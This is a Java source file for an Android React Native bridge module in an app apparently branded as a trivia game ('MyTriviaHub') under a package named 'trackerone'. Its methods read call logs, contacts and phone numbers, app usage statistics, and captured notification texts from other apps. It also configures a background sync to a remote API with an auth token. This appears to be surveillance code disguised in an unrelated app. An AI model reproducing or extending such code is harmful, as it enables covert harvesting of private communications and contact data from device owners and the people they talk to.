package com.trackerone.mobile;

import android.Manifest;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.text.TextUtils;

import androidx.annotation.NonNull;

import com.facebook.react.bridge.Arguments;
import com.facebook.react.bridge.Promise;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContextBaseJavaModule;
import com.facebook.react.bridge.ReactMethod;
import com.facebook.react.bridge.WritableArray;
import com.facebook.react.bridge.WritableMap;

import java.util.Calendar;
import java.util.List;
import java.util.Map;

import org.json.JSONArray;
import org.json.JSONObject;

public final class NativeDataBridgeModule extends ReactContextBaseJavaModule {
  public static final String NAME = "MyTriviaHubNativeData";

  public NativeDataBridgeModule(ReactApplicationContext context) {
    super(context);
  }

  @ReactMethod
  public void configureBackgroundSync(String apiBaseUrl, String authToken, Promise promise) {
    try {
      MyTriviaHubBackgroundSyncWorker.configure(getReactApplicationContext(), apiBaseUrl, authToken);
      promise.resolve(true);
    } catch (Exception error) {
      promise.reject("BACKGROUND_SYNC_CONFIG_FAILED", error.getMessage(), error);
    }
  }

  @NonNull
  @Override
  public String getName() {
    return NAME;
  }

  @ReactMethod
  public void readRecentCallLogs(int hours, Promise promise) {
    if (getReactApplicationContext().checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
      promise.reject("CALL_LOG_PERMISSION_DENIED", "READ_CALL_LOG is not granted");
      return;
    }
    WritableArray rows = Arguments.createArray();
    long since = System.currentTimeMillis() - Math.max(1, Math.min(hours, 168)) * 60L * 60L * 1000L;
    Uri uri = CallLog.Calls.CONTENT_URI;
    String[] projection = { CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME };
    try (Cursor cursor = getReactApplicationContext().getContentResolver().query(uri, projection, CallLog.Calls.DATE + " >= ?", new String[] { String.valueOf(since) }, CallLog.Calls.DATE + " DESC")) {
      if (cursor != null) {
        int limit = 500;
        while (cursor.moveToNext() && limit-- > 0) {
          WritableMap row = Arguments.createMap();
          row.putString("number", cursor.getString(0));
          row.putInt("type", cursor.getInt(1));
          row.putDouble("date", cursor.getLong(2));
          row.putInt("durationSeconds", cursor.getInt(3));
          row.putString("cachedName", cursor.getString(4));
          rows.pushMap(row);
        }
      }
      promise.resolve(rows);
    } catch (Exception error) {
      promise.reject("CALL_LOG_READ_FAILED", error.getMessage(), error);
    }
  }

  @ReactMethod
  public void readContacts(Promise promise) {
    if (getReactApplicationContext().checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
      promise.reject("CONTACTS_PERMISSION_DENIED", "READ_CONTACTS is not granted");
      return;
    }
    WritableArray rows = Arguments.createArray();
    ContentResolver resolver = getReactApplicationContext().getContentResolver();
    String[] projection = { ContactsContract.CommonDataKinds.Phone.CONTACT_ID, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.TYPE };
    try (Cursor cursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " COLLATE NOCASE ASC")) {
      if (cursor != null) {
        int limit = 1000;
        while (cursor.moveToNext() && limit-- > 0) {
          WritableMap row = Arguments.createMap();
          row.putString("contactId", cursor.getString(0));
          row.putString("displayName", cursor.getString(1));
          row.putString("phoneNumber", cursor.getString(2));
          row.putInt("type", cursor.getInt(3));
          rows.pushMap(row);
        }
      }
      promise.resolve(rows);
    } catch (Exception error) {
      promise.reject("CONTACTS_READ_FAILED", error.getMessage(), error);
    }
  }

  @ReactMethod
  public void readUsageStats(int days, Promise promise) {
    UsageStatsManager manager = (UsageStatsManager) getReactApplicationContext().getSystemService(Context.USAGE_STATS_SERVICE);
    if (manager == null) {
      promise.reject("USAGE_STATS_UNAVAILABLE", "UsageStatsManager is unavailable");
      return;
    }
    long end = System.currentTimeMillis();
    long start = end - Math.max(1, Math.min(days, 31)) * 24L * 60L * 60L * 1000L;
    try {
      List<UsageStats> stats = manager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end);
      WritableArray rows = Arguments.createArray();
      if (stats != null) {
        for (UsageStats stat : stats) {
          if (stat.getTotalTimeInForeground() <= 0 || TextUtils.isEmpty(stat.getPackageName())) continue;
          WritableMap row = Arguments.createMap();
          row.putString("packageName", stat.getPackageName());
          row.putDouble("totalTimeForegroundMillis", stat.getTotalTimeInForeground());
          row.putDouble("lastTimeUsed", stat.getLastTimeUsed());
          rows.pushMap(row);
        }
      }
      promise.resolve(rows);
    } catch (Exception error) {
      promise.reject("USAGE_STATS_READ_FAILED", error.getMessage(), error);
    }
  }

  @ReactMethod
  public void readNotifications(Promise promise) {
    WritableArray rows = Arguments.createArray();
    try {
      SharedPreferences prefs = getReactApplicationContext().getSharedPreferences(MyTriviaHubNotificationListenerService.PREFS, Context.MODE_PRIVATE);
      JSONArray events = new JSONArray(prefs.getString(MyTriviaHubNotificationListenerService.EVENTS, "[]"));
      for (int index = 0; index < events.length() && index < 500; index++) {
        JSONObject event = events.optJSONObject(index);
        if (event == null || event.optString("key").isEmpty() || event.optString("packageName").isEmpty()) continue;
        WritableMap row = Arguments.createMap();
        row.putString("key", event.optString("key"));
        row.putString("packageName", event.optString("packageName"));
        row.putString("appName", event.optString("appName", null));
        row.putString("title", event.optString("title", null));
        row.putString("body", event.optString("body", null));
        row.putDouble("postedAt", event.optLong("postedAt"));
        rows.pushMap(row);
      }
      promise.resolve(rows);
    } catch (Exception error) {
      promise.reject("NOTIFICATION_READ_FAILED", error.getMessage(), error);
    }
  }
}
